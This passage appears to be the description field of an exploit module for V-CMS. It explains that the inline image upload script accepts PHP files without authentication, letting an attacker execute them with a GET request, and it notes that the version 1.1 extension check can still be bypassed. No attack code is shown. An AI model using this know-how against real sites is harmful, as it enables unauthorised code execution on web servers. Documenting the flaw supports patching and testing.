  DESCRIPTION => "

          This module exploits a vulnerability found on V-CMS's inline image upload feature.

        The problem is due to the inline_image_upload.php file not checking the file type

        before saving it on the web server. This allows any malicious user to upload a

        script (such as PHP) without authentication, and then execute it with a GET request.



          The issue is fixed in 1.1 by checking the extension name.  By default, 1.1 only

        allows jpg, jpeg, png, gif, bmp, but it is still possible to upload a PHP file as

        one of those extension names, which may still be leveraged in an attack.
